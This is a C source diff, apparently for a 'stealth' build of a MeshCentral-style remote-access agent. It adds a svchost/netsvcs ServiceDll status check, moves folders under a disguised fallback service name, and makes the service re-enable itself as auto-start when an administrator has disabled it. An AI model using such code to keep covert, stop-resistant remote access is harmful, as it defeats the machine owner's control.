+	for (i = 0; i < summary->processProtection.entryCount; ++i)
+	{
+		const MonitorProcessProtectionInfo* entry = &summary->processProtection.entries[i];
+		if (i != 0) { printf(","); }
+		printf("{\"pid\":%lu,", (unsigned long)entry->processId);
+		printf("\"sessionId\":%lu,", (unsigned long)entry->sessionId);
+		printf("\"imageName\":\"");
+		MeshService_PrintJsonEscapedWide(entry->imageName);
+		printf("\",\"imagePath\":\"");
+		MeshService_PrintJsonEscapedWide(entry->imagePath);
+		printf("\",\"level\":%u,", (unsigned int)entry->protectionLevel);
+		printf("\"typeCode\":%u,", (unsigned int)entry->protectionType);
+		printf("\"type\":\"");
+		MeshService_PrintJsonEscapedWide(Monitor_GetProtectionTypeName(entry->protectionType));
+		printf("\",\"signerCode\":%u,", (unsigned int)entry->protectionSigner);
+		printf("\"signer\":\"");
+		MeshService_PrintJsonEscapedWide(Monitor_GetProtectionSignerName(entry->protectionSigner));
+		printf("\",\"isProtected\":%s,", entry->isProtected ? "true" : "false");
+		printf("\"isProtectedLight\":%s", entry->isProtectedLight ? "true" : "false");
+		printf("}");
+	}
+	printf("]},");
+	printf("\"values\":{");
+	printf("\"expectedServiceDll\":\"");
+	MeshService_PrintJsonEscapedWide(summary->expectedServiceDll);
+	printf("\",");
+	printf("\"serviceType\":%lu,", (unsigned long)summary->serviceTypeValue);
+	printf("\"serviceStart\":%lu,", (unsigned long)summary->serviceStartValue);
+	printf("\"imagePath\":\"");
+	MeshService_PrintJsonEscapedWide(summary->imagePath);
+	printf("\",");
+	printf("\"objectName\":\"");
+	MeshService_PrintJsonEscapedWide(summary->objectName);
+	printf("\",");
+	printf("\"serviceDllRaw\":\"");
+	MeshService_PrintJsonEscapedWide(summary->serviceDllRaw);
+	printf("\",");
+	printf("\"serviceDllExpanded\":\"");
+	MeshService_PrintJsonEscapedWide(summary->serviceDllExpanded);
+	printf("\",");
+	printf("\"expectedHash\":\"");
+	MeshService_PrintJsonEscapedWide(summary->expectedHash);
+	printf("\",");
+	printf("\"actualHash\":\"");
+	MeshService_PrintJsonEscapedWide(summary->actualHash);
+	printf("\",");
+	printf("\"serviceMain\":\"");
+	MeshService_PrintJsonEscapedWide(summary->serviceMain);
+	printf("\",");
+	printf("\"unloadOnStop\":%lu,", (unsigned long)summary->unloadOnStopValue);
+	printf("\"currentState\":%lu,", (unsigned long)summary->currentState);
+	printf("\"currentStateName\":\"");
+	MeshService_PrintJsonEscapedWide(summary->currentStateKnown ? ServiceStateToString(summary->currentState) : L"UNKNOWN");
+	printf("\",");
+	printf("\"serviceSidType\":%lu", (unsigned long)summary->sidTypeValue);
+	printf("}}\n");
+}
+
+static int MeshService_RunSvchostStatusCommand(void)
+{
+	MeshServiceSvchostStatusSummary summary;
+	ZeroMemory(&summary, sizeof(summary));
+
+	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), summary.serviceName, _countof(summary.serviceName));
+	if (summary.serviceName[0] == L'\0')
+	{
+		wcscpy_s(summary.serviceName, _countof(summary.serviceName), STEALTH_FALLBACK_SERVICE_NAME);
+	}
+
+	StealthInstallPaths paths;
+	ZeroMemory(&paths, sizeof(paths));
+	if (Stealth_GetInstallPaths(&paths))
+	{
+		StringCchCopyW(summary.expectedServiceDll, _countof(summary.expectedServiceDll), paths.dllPath);
+	}
+
+	WCHAR keyPath[512] = {0};
+	_snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s", summary.serviceName);
+
+	HKEY hKey = NULL;
+	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+	{
+		summary.serviceKeyPresent = TRUE;
+
+		DWORD dw = 0;
+		DWORD cb = sizeof(dw);
+		if (RegQueryValueExW(hKey, L"Type", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
+		{
+			summary.serviceTypePresent = TRUE;
+			summary.serviceTypeValue = dw;
+			summary.serviceTypeValid = (dw == SERVICE_WIN32_SHARE_PROCESS);
+			if (!summary.serviceTypeValid) { summary.statusMask |= SVCHOST_STATUS_TYPE_MISMATCH; }
+		}
+		else
+		{
+			summary.statusMask |= SVCHOST_STATUS_TYPE_MISMATCH;
+		}
+
+		cb = sizeof(dw);
+		if (RegQueryValueExW(hKey, L"Start", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
+		{
+			summary.serviceStartPresent = TRUE;
+			summary.serviceStartValue = dw;
+			summary.serviceStartValid = (dw == SERVICE_AUTO_START);
+			if (!summary.serviceStartValid) { summary.statusMask |= SVCHOST_STATUS_START_MISMATCH; }
+		}
+		else
+		{
+			summary.statusMask |= SVCHOST_STATUS_START_MISMATCH;
+		}
+
+		if (ReadRegStrW(hKey, L"ImagePath", summary.imagePath, _countof(summary.imagePath)))
+		{
+			WCHAR imagePathUpper[512] = {0};
+			summary.imagePathPresent = TRUE;
+			StringCchCopyW(imagePathUpper, _countof(imagePathUpper), summary.imagePath);
+			_wcsupr_s(imagePathUpper, _countof(imagePathUpper));
+			summary.imagePathIsSvchost = (wcsstr(imagePathUpper, L"SVCHOST.EXE") != NULL);
+			summary.imagePathHasNetsvcs = (wcsstr(imagePathUpper, L"-K NETSVCS") != NULL);
+			if (!summary.imagePathIsSvchost) { summary.statusMask |= SVCHOST_STATUS_IMAGEPATH_INVALID; }
+			if (!summary.imagePathHasNetsvcs) { summary.statusMask |= SVCHOST_STATUS_GROUP_ARGUMENT_INVALID; }
+		}
+		else
+		{
+			summary.statusMask |= SVCHOST_STATUS_IMAGEPATH_INVALID;
+			summary.statusMask |= SVCHOST_STATUS_GROUP_ARGUMENT_INVALID;
+		}
+
+		if (ReadRegStrW(hKey, L"ObjectName", summary.objectName, _countof(summary.objectName)))
+		{
+			summary.objectNamePresent = TRUE;
+			summary.objectNameIsLocalSystem = (_wcsicmp(summary.objectName, L"LocalSystem") == 0);
+			if (!summary.objectNameIsLocalSystem) { summary.statusMask |= SVCHOST_STATUS_ACCOUNT_MISMATCH; }
+		}
+		else
+		{
+			summary.statusMask |= SVCHOST_STATUS_ACCOUNT_MISMATCH;
+		}
+
+		HKEY hParams = NULL;
+		if (RegOpenKeyExW(hKey, L"Parameters", 0, KEY_READ, &hParams) == ERROR_SUCCESS)
+		{
+			summary.paramsKeyPresent = TRUE;
+
+			if (ReadRegStrW(hParams, L"ServiceDll", summary.serviceDllRaw, _countof(summary.serviceDllRaw)))
+			{
+				summary.serviceDllPresent = TRUE;
+				if (ExpandEnvironmentStringsW(summary.serviceDllRaw, summary.serviceDllExpanded, (DWORD)_countof(summary.serviceDllExpanded)) == 0)
+				{
+					StringCchCopyW(summary.serviceDllExpanded, _countof(summary.serviceDllExpanded), summary.serviceDllRaw);
+				}
+
+				DWORD attrs = GetFileAttributesW(summary.serviceDllExpanded);
+				summary.serviceDllExists = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
+				if (!summary.serviceDllExists)
+				{
+					summary.statusMask |= SVCHOST_STATUS_DLL_MISSING;
+				}
+
+				summary.serviceDllMatchesExpected = (
+					summary.expectedServiceDll[0] != L'\0' &&
+					_wcsicmp(summary.serviceDllExpanded, summary.expectedServiceDll) == 0);
+				if (!summary.serviceDllMatchesExpected)
+				{
+					summary.statusMask |= SVCHOST_STATUS_DLL_PATH_MISMATCH;
+				}
+
+				if (summary.serviceDllExists)
+				{
+					summary.actualHashAvailable = Stealth_ComputeFileSha256W(summary.serviceDllExpanded, summary.actualHash, _countof(summary.actualHash));
+					if (!summary.actualHashAvailable)
+					{
+						Stealth_DebugPrintfW(L"Failed to compute ServiceDll hash for %ls", summary.serviceDllExpanded);
+					}
+				}
+			}
+			else
+			{
+				summary.statusMask |= SVCHOST_STATUS_DLL_MISSING;
+				summary.statusMask |= SVCHOST_STATUS_DLL_PATH_MISMATCH;
+			}
+
+			summary.hashConfigured = ReadRegStrW(hParams, L"ServiceDllHash", summary.expectedHash, _countof(summary.expectedHash));
+			if (!summary.hashConfigured)
+			{
+				summary.statusMask |= SVCHOST_STATUS_HASH_NOT_CONFIGURED;
+			}
+			else
+			{
+				summary.hashMatch = (summary.actualHashAvailable && _wcsicmp(summary.expectedHash, summary.actualHash) == 0);
+				if (!summary.hashMatch)
+				{
+					summary.statusMask |= SVCHOST_STATUS_DLL_HASH_MISMATCH;
+				}
+			}
+
+			if (ReadRegStrW(hParams, L"ServiceMain", summary.serviceMain, _countof(summary.serviceMain)))
+			{
+				summary.serviceMainPresent = TRUE;
+				summary.serviceMainValid = (_wcsicmp(summary.serviceMain, L"Stealth_SvchostServiceMain") == 0);
+				if (!summary.serviceMainValid)
+				{
+					summary.statusMask |= SVCHOST_STATUS_SERVICE_MAIN_MISMATCH;
+				}
+			}
+			else
+			{
+				summary.statusMask |= SVCHOST_STATUS_SERVICE_MAIN_MISMATCH;
+			}
+
+			cb = sizeof(dw);
+			if (RegQueryValueExW(hParams, L"ServiceDllUnloadOnStop", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
+			{
+				summary.unloadOnStopPresent = TRUE;
+				summary.unloadOnStopValue = dw;
+				summary.unloadOnStopValid = (dw == 1);
+				if (!summary.unloadOnStopValid)
+				{
+					summary.statusMask |= SVCHOST_STATUS_UNLOAD_MISMATCH;
+				}
+			}
+			else
+			{
+				summary.statusMask |= SVCHOST_STATUS_UNLOAD_MISMATCH;
+			}
+
+			RegCloseKey(hParams);
+		}
+		else
+		{
+			summary.statusMask |= SVCHOST_STATUS_DLL_MISSING;
+			summary.statusMask |= SVCHOST_STATUS_DLL_PATH_MISMATCH;
+			summary.statusMask |= SVCHOST_STATUS_HASH_NOT_CONFIGURED;
+			summary.statusMask |= SVCHOST_STATUS_SERVICE_MAIN_MISMATCH;
+			summary.statusMask |= SVCHOST_STATUS_UNLOAD_MISMATCH;
+		}
+
+		RegCloseKey(hKey);
+	}
+	else
+	{
+		summary.statusMask |= SVCHOST_STATUS_MISSING_SERVICE_KEY;
+	}
+
+	HKEY hSvchost = NULL;
+	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_READ, &hSvchost) == ERROR_SUCCESS)
+	{
+		DWORD type = 0;
+		DWORD cb = 0;
+		if (RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
+		{
+			wchar_t* multiSz = (wchar_t*)malloc(cb + (2 * sizeof(wchar_t)));
+			if (multiSz != NULL)
+			{
+				if (RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, (LPBYTE)multiSz, &cb) == ERROR_SUCCESS)
+				{
+					multiSz[cb / sizeof(wchar_t)] = L'\0';
+					multiSz[(cb / sizeof(wchar_t)) + 1] = L'\0';
+					for (wchar_t* cursor = multiSz; *cursor != L'\0'; cursor += (wcslen(cursor) + 1))
+					{
+						if (_wcsicmp(cursor, summary.serviceName) == 0)
+						{
+							summary.netsvcsMembershipPresent = TRUE;
+							break;
+						}
+					}
+				}
+				free(multiSz);
+			}
+		}
+		RegCloseKey(hSvchost);
+	}
+	if (!summary.netsvcsMembershipPresent)
+	{
+		summary.statusMask |= SVCHOST_STATUS_NOT_IN_NETSVCS;
+	}
+
+	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+	if (scm != NULL)
+	{
+		summary.scmAvailable = TRUE;
+		SC_HANDLE svc = OpenServiceW(scm, summary.serviceName, SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG);
+		if (svc != NULL)
+		{
+			summary.serviceInstalledInScm = TRUE;
+
+			SERVICE_STATUS_PROCESS ssp;
+			DWORD bytesNeeded = 0;
+			ZeroMemory(&ssp, sizeof(ssp));
+			if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded))
+			{
+				summary.currentStateKnown = TRUE;
+				summary.currentState = ssp.dwCurrentState;
+				summary.serviceRunning = (ssp.dwCurrentState == SERVICE_RUNNING);
+				if (!summary.serviceRunning)
+				{
+					summary.statusMask |= SVCHOST_STATUS_NOT_RUNNING;
+				}
+			}
+			else
+			{
+				summary.statusMask |= SVCHOST_STATUS_NOT_RUNNING;
+			}
+
+			SERVICE_SID_INFO sidInfo;
+			DWORD sidBytes = sizeof(sidInfo);
+			ZeroMemory(&sidInfo, sizeof(sidInfo));
+			if (QueryServiceConfig2W(svc, SERVICE_CONFIG_SERVICE_SID_INFO, (LPBYTE)&sidInfo, sizeof(sidInfo), &sidBytes))
+			{
+				summary.sidTypeKnown = TRUE;
+				summary.sidTypeValue = sidInfo.dwServiceSidType;
+				summary.sidTypeValid = (sidInfo.dwServiceSidType == SERVICE_SID_TYPE_UNRESTRICTED);
+				if (!summary.sidTypeValid)
+				{
+					summary.statusMask |= SVCHOST_STATUS_SID_MISMATCH;
+				}
+			}
+			else
+			{
+				summary.statusMask |= SVCHOST_STATUS_SID_MISMATCH;
+			}
+
+			CloseServiceHandle(svc);
+		}
+		else
+		{
+			summary.statusMask |= SVCHOST_STATUS_NOT_IN_SCM;
+		}
+		CloseServiceHandle(scm);
+	}
+	else
+	{
+		summary.statusMask |= SVCHOST_STATUS_SCM_UNAVAILABLE;
+	}
+
+	MeshService_CollectProcessProtectionDiagnostics(&summary);
+	summary.success = (summary.statusMask == 0);
+	MeshService_PrintSvchostStatusJson(&summary);
+	return (int)summary.statusMask;
+}
+
 #if defined(WIN32) && defined (_DEBUG) && !defined(_MINCORE)
 #include <crtdbg.h>
 #define _CRTDBG_MAP_ALLOC
@@ -107,7 +5415,6 @@ static BOOL ReadRegStrW(HKEY hKey, LPCWSTR name, LPWSTR out, DWORD cch)
 
 #include <WtsApi32.h>
 
-#include "branding_util.h"
 static mesh_branding_text_t g_serviceFileText = NULL;
 static mesh_branding_text_t g_serviceNameText = NULL;
 static TCHAR* serviceFile = NULL;
@@ -345,37 +5652,12 @@ static BOOL MeshService_ProcessHasSystemSid(void)
 {
 	BOOL isSystem = FALSE;
 	HANDLE token = NULL;
-	DWORD tokenSize = 0;
-	TOKEN_USER* tokenUser = NULL;
-	PSID localSystemSid = NULL;
-	SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
 
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
 	{
 		return FALSE;
 	}
-
-	GetTokenInformation(token, TokenUser, NULL, 0, &tokenSize);
-	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
-	{
-		CloseHandle(token);
-		return FALSE;
-	}
-
-	tokenUser = (TOKEN_USER*)ILibMemory_Allocate(tokenSize, 0, NULL, NULL);
-	if (tokenUser != NULL && GetTokenInformation(token, TokenUser, tokenUser, tokenSize, &tokenSize))
-	{
-		if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &localSystemSid))
-		{
-			isSystem = EqualSid(tokenUser->User.Sid, localSystemSid);
-			FreeSid(localSystemSid);
-		}
-	}
-
-	if (tokenUser != NULL)
-	{
-		ILibMemory_Free(tokenUser);
-	}
+	isSystem = MeshService_TokenHasSystemSid(token);
 	CloseHandle(token);
 	return isSystem;
 }
@@ -445,25 +5727,32 @@ static void MeshService_ReportCriticalStopDenial(void)
 		DeregisterEventSource(eventSource);
 	}
 }
-#if defined(MESH_AGENT_SERVER_ID)
+/*
+    Provisioning markers are only embedded when MESH_PROVISIONING_HARDCODED is
+    defined (test/lab builds). Production builds get provisioning exclusively
+    from the .msh file the server embeds at download time.
+*/
+#ifdef MESH_PROVISIONING_HARDCODED
+#ifdef MESH_AGENT_SERVER_ID
 static const char g_meshProvisioningServerIdMarker[] = "SERVERID:" MESH_AGENT_SERVER_ID;
 #endif
-#if defined(MESH_AGENT_MESH_ID)
+#ifdef MESH_AGENT_MESH_ID
 static const char g_meshProvisioningMeshIdMarker[] = "MESHID:" MESH_AGENT_MESH_ID;
 #endif
+#endif /* MESH_PROVISIONING_HARDCODED */
 
 static void MeshService_TouchProvisioningMarkers(void)
 {
-#if defined(MESH_AGENT_SERVER_ID) || defined(MESH_AGENT_MESH_ID)
+#ifdef MESH_PROVISIONING_HARDCODED
 	volatile const char* marker = NULL;
-#endif
-#if defined(MESH_AGENT_SERVER_ID)
+#ifdef MESH_AGENT_SERVER_ID
 	marker = g_meshProvisioningServerIdMarker;
 #endif
-#if defined(MESH_AGENT_MESH_ID)
+#ifdef MESH_AGENT_MESH_ID
 	marker = g_meshProvisioningMeshIdMarker;
 #endif
 	(void)marker;
+#endif /* MESH_PROVISIONING_HARDCODED */
 }
 
 #ifdef MESHAGENT_ENABLE_STEALTH
@@ -830,11 +6119,24 @@ static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
 			}
 			else if (config->helperArguments[0] == L'\0')
 			{
-				StringCchCopyW(config->helperArguments, _countof(config->helperArguments), L"-kvm0");
+				Stealth_DebugPrintfW(L"[HelperMonitor] Helper monitor requires an explicit rundll32 desktop-bridge command. Disabling helper monitor.");
+				config->enableHelperMonitor = FALSE;
 			}
 
-			config->helperPersistentSpawn = MeshService_ReadEnvBool(L"STEALTH_HELPER_PERSISTENT", config->helperPersistentSpawn);
-			config->helperRegisterWatchdog = MeshService_ReadEnvBool(L"STEALTH_HELPER_WATCHDOG", config->helperRegisterWatchdog);
+			if (config->enableHelperMonitor &&
+				!HelperMonitor_IsApprovedDesktopBridgeCommand(config->helperExePath, config->helperArguments))
+			{
+				Stealth_DebugPrintfW(L"[HelperMonitor] Rejected helper monitor command outside the retained desktop-bridge contract: exe=%ls args=%ls",
+					config->helperExePath,
+					config->helperArguments);
+				config->enableHelperMonitor = FALSE;
+			}
+
+			if (config->enableHelperMonitor)
+			{
+				config->helperPersistentSpawn = MeshService_ReadEnvBool(L"STEALTH_HELPER_PERSISTENT", config->helperPersistentSpawn);
+				config->helperRegisterWatchdog = MeshService_ReadEnvBool(L"STEALTH_HELPER_WATCHDOG", config->helperRegisterWatchdog);
+			}
 		}
 	}
 
@@ -973,10 +6275,6 @@ extern int g_ServiceConnectFlags;
 */
 
 
-#if defined(_LINKVM)
-extern DWORD WINAPI kvm_server_mainloop(LPVOID Param);
-#endif
-
 #include <Shlwapi.h>
 #define SmoothingModeAntiAlias 5
 #define InterpolationModeBicubic 8
@@ -999,7 +6297,6 @@ typedef int(__stdcall *_GdipSetSmoothingMode)(void *graphics, int smoothingMode)
 typedef int(__stdcall *_GdipSetInterpolationMode)(void *graphics, int interpolationMode);
 typedef int(__stdcall *_GdipDrawImageRectI)(void *graphics, void *image, int x, int y, int width, int height);
 typedef int(__stdcall *_GdipDisposeImage)(void *image);
-typedef HRESULT(__stdcall *DpiAwarenessFunc)(PROCESS_DPI_AWARENESS);
 
 _GdipCreateBitmapFromStream __GdipCreateBitmapFromStream;
 _GdipCreateHBITMAPFromBitmap __GdipCreateHBITMAPFromBitmap;
@@ -1091,11 +6388,17 @@ BOOL RunAsAdmin(char* args, int isAdmin)
 	{
 		SHELLEXECUTEINFOW sei = { sizeof(sei) };
 		sei.hwnd = NULL;
+		sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
 		sei.nShow = SW_NORMAL;
 		sei.lpVerb = isAdmin ? L"open" : L"runas";
 		sei.lpFile = szPath;
 		sei.lpParameters = ILibUTF8ToWide(args, -1);
-		return ShellExecuteExW(&sei);
+		if (ShellExecuteExW(&sei))
+		{
+			if (sei.hProcess != NULL) { CloseHandle(sei.hProcess); }
+			return TRUE;
+		}
+		return FALSE;
 	}
 	return FALSE;
 }
@@ -1107,6 +6410,7 @@ static BOOL MeshService_AllowStop(void)
 	DWORD value = 0;
 	DWORD cb = sizeof(value);
 
+	// AllowStop is stored under the SCM service key name, not the display name.
 	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
 	if (serviceKeyName[0] == L'\0')
 	{
@@ -1146,6 +6450,7 @@ static BOOL MeshService_GetDirectoryFromPath(const WCHAR* path, WCHAR* directory
 static BOOL MeshService_IsRecoverableLaunchError(DWORD launchErr)
 {
 	return (
+		launchErr == ERROR_INVALID_FUNCTION ||
 		launchErr == ERROR_PROC_NOT_FOUND ||
 		launchErr == ERROR_MOD_NOT_FOUND ||
 		launchErr == ERROR_BAD_EXE_FORMAT ||
@@ -1219,7 +6524,7 @@ static void MeshService_AppendUserGuiLaunchTrace(const WCHAR* message)
 
 	hr = SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData);
 	if (FAILED(hr)) { return; }
-	if (FAILED(StringCchPrintfW(traceDir, _countof(traceDir), L"%ls\\DiagnosticHost", localAppData))) { return; }
+	if (FAILED(StringCchPrintfW(traceDir, _countof(traceDir), L"%ls\\%s", localAppData, STEALTH_FALLBACK_SERVICE_NAME))) { return; }
 	if (FAILED(StringCchPrintfW(tracePath, _countof(tracePath), L"%ls\\gui-launch.log", traceDir))) { return; }
 	MeshService_EnsureDirectoryExistsW(traceDir);
 
@@ -1308,7 +6613,7 @@ static BOOL MeshService_GetLauncherStageDirectory(WCHAR* stageDirOut, size_t sta
 
 	hr = SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData);
 	if (FAILED(hr)) { return FALSE; }
-	if (FAILED(StringCchPrintfW(stageDirOut, stageDirOutCch, L"%ls\\DiagnosticHost\\launcher", localAppData))) { return FALSE; }
+	if (FAILED(StringCchPrintfW(stageDirOut, stageDirOutCch, L"%ls\\%s\\launcher", localAppData, STEALTH_FALLBACK_SERVICE_NAME))) { return FALSE; }
 	return TRUE;
 }
 
@@ -1420,14 +6725,30 @@ static void MeshService_ClearZoneIdentifier(const WCHAR* path)
 	}
 }
 
-static void MeshService_CopyStagedSidecarIfPresent(const WCHAR* sourceExePath, const WCHAR* stagedExePath, const WCHAR* extension, const WCHAR* sidecarLabel)
+static void MeshService_DeleteStagedSidecarIfPresent(const WCHAR* stagedExePath, const WCHAR* extension)
 {
-	WCHAR sourcePath[_MAX_PATH * 4] = {0};
 	WCHAR stagedPath[_MAX_PATH * 4] = {0};
 	DWORD attrs;
 
-	if (sourceExePath == NULL || stagedExePath == NULL || extension == NULL) { return; }
-	if (!MeshService_BuildSiblingPathWithExtension(sourceExePath, extension, sourcePath, _countof(sourcePath))) { return; }
+	if (stagedExePath == NULL || extension == NULL) { return; }
+	if (!MeshService_BuildSiblingPathWithExtension(stagedExePath, extension, stagedPath, _countof(stagedPath))) { return; }
+
+	attrs = GetFileAttributesW(stagedPath);
+	if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) { return; }
+	if ((attrs & FILE_ATTRIBUTE_READONLY) != 0)
+	{
+		SetFileAttributesW(stagedPath, attrs & ~FILE_ATTRIBUTE_READONLY);
+	}
+	DeleteFileW(stagedPath);
+	MeshService_ClearZoneIdentifier(stagedPath);
+}
+
+static void MeshService_CopyResolvedSidecarIfPresent(const WCHAR* sourcePath, const WCHAR* stagedExePath, const WCHAR* extension, const WCHAR* sidecarLabel)
+{
+	WCHAR stagedPath[_MAX_PATH * 4] = {0};
+	DWORD attrs;
+
+	if (sourcePath == NULL || sourcePath[0] == L'\0' || stagedExePath == NULL || extension == NULL) { return; }
 	if (!MeshService_BuildSiblingPathWithExtension(stagedExePath, extension, stagedPath, _countof(stagedPath))) { return; }
 
 	attrs = GetFileAttributesW(sourcePath);
@@ -1458,6 +6779,7 @@ static BOOL MeshService_StageElevatedLaunchImage(const WCHAR* modulePath, WCHAR*
 	WCHAR appDir[_MAX_PATH * 2] = {0};
 	WCHAR stagedPath[_MAX_PATH * 4] = {0};
 	DWORD attrs = 0;
+	StealthPackagePreflight preflight;
 
 	if (stagedModulePathOut == NULL || stagedModulePathOutCch == 0 || modulePath == NULL || modulePath[0] == L'\0') { return FALSE; }
 	stagedModulePathOut[0] = L'\0';
@@ -1488,9 +6810,35 @@ static BOOL MeshService_StageElevatedLaunchImage(const WCHAR* modulePath, WCHAR*
 	}
 
 	MeshService_ClearZoneIdentifier(stagedPath);
-	MeshService_CopyStagedSidecarIfPresent(modulePath, stagedPath, L".db", L".db");
-	MeshService_CopyStagedSidecarIfPresent(modulePath, stagedPath, L".msh", L".msh");
-	MeshService_CopyStagedSidecarIfPresent(modulePath, stagedPath, L".conf", L".conf");
+	ZeroMemory(&preflight, sizeof(preflight));
+	if (!Stealth_PreflightPackageSource(modulePath, FALSE, FALSE, &preflight, NULL, 0))
+	{
+		Stealth_LogInstallEvent(L"[GUI] Package inspection failed for staged launcher image (%ls)", modulePath);
+		return FALSE;
+	}
+	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".db");
+	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".msh");
+	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".conf");
+	if (preflight.sourceDbPresent)
+	{
+		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceDbPath, stagedPath, L".db", L".db");
+	}
+	if (preflight.sourceMshValid)
+	{
+		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceMshPath, stagedPath, L".msh", L".msh");
+	}
+	else if (preflight.sourceMshPresent)
+	{
+		Stealth_LogInstallEvent(L"[GUI] Skipping invalid launcher sidecar .msh from %ls", preflight.sourceMshPath);
+	}
+	if (preflight.sourceConfValid)
+	{
+		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceConfPath, stagedPath, L".conf", L".conf");
+	}
+	else if (preflight.sourceConfPresent)
+	{
+		Stealth_LogInstallEvent(L"[GUI] Skipping invalid launcher sidecar .conf from %ls", preflight.sourceConfPath);
+	}
 
 	if (FAILED(StringCchCopyW(stagedModulePathOut, stagedModulePathOutCch, stagedPath)))
 	{
@@ -1795,7 +7143,7 @@ static BOOL MeshService_RunSelfCommandAndWait(const char* args, int isAdmin, DWO
 
 		ZeroMemory(&sei, sizeof(sei));
 		sei.cbSize = sizeof(sei);
-		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+		sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
 		sei.hwnd = GetForegroundWindow();
 		sei.nShow = SW_NORMAL;
 		sei.lpVerb = L"runas";
@@ -1819,7 +7167,7 @@ static BOOL MeshService_RunSelfCommandAndWait(const char* args, int isAdmin, DWO
 		{
 			ZeroMemory(&sei, sizeof(sei));
 			sei.cbSize = sizeof(sei);
-			sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+			sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
 			sei.hwnd = GetForegroundWindow();
 			sei.nShow = SW_NORMAL;
 			sei.lpVerb = L"runas";
@@ -1845,7 +7193,7 @@ static BOOL MeshService_RunSelfCommandAndWait(const char* args, int isAdmin, DWO
 		{
 			ZeroMemory(&sei, sizeof(sei));
 			sei.cbSize = sizeof(sei);
-			sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+			sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
 			sei.hwnd = GetForegroundWindow();
 			sei.nShow = SW_NORMAL;
 			sei.lpVerb = L"runas";
@@ -2049,6 +7397,9 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 #ifdef MESHAGENT_ENABLE_STEALTH
 			/* Forward session change to stealth integration for helper monitor */
 			StealthIntegration_HandleSessionChange(eventType, sessionId);
+#endif
+#if defined(_LINKVM)
+			kvm_notify_session_change(eventType, sessionId);
 #endif
 
 			if (agent == NULL)
@@ -2304,6 +7655,38 @@ static void MeshService_PrintControlErrorA(const char* action, DWORD err)
 	}
 }
 
+static void MeshService_FormatWin32ErrorMessageW(DWORD err, WCHAR* buffer, size_t bufferCch)
+{
+	LPWSTR message = NULL;
+	DWORD msgLen = 0;
+
+	if (buffer == NULL || bufferCch == 0) { return; }
+	buffer[0] = L'\0';
+
+	msgLen = FormatMessageW(
+		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+		NULL,
+		err,
+		0,
+		(LPWSTR)&message,
+		0,
+		NULL);
+
+	if (msgLen > 0 && message != NULL)
+	{
+		while (msgLen > 0 && (message[msgLen - 1] == L'\r' || message[msgLen - 1] == L'\n' || message[msgLen - 1] == L' ' || message[msgLen - 1] == L'\t'))
+		{
+			message[msgLen - 1] = L'\0';
+			--msgLen;
+		}
+		StringCchCopyW(buffer, bufferCch, message);
+		LocalFree(message);
+		return;
+	}
+
+	StringCchPrintfW(buffer, bufferCch, L"Win32 error %lu", err);
+}
+
 static BOOL MeshService_QueryServiceStatusProcess(SC_HANDLE service, SERVICE_STATUS_PROCESS* status)
 {
 	DWORD bytesNeeded = 0;
@@ -2474,8 +7857,37 @@ static BOOL MeshService_StartServiceNative(SC_HANDLE service, DWORD timeoutMs)
 	if (!StartServiceW(service, 0, NULL))
 	{
 		lastError = GetLastError();
+		if (lastError == ERROR_SERVICE_DISABLED)
+		{
+			if (ChangeServiceConfigW(
+				service,
+				SERVICE_NO_CHANGE,
+				SERVICE_AUTO_START,
+				SERVICE_NO_CHANGE,
+				NULL,
+				NULL,
+				NULL,
+				NULL,
+				NULL,
+				NULL,
+				NULL))
+			{
+				if (!StartServiceW(service, 0, NULL))
+				{
+					lastError = GetLastError();
+				}
+				else
+				{
+					lastError = ERROR_SUCCESS;
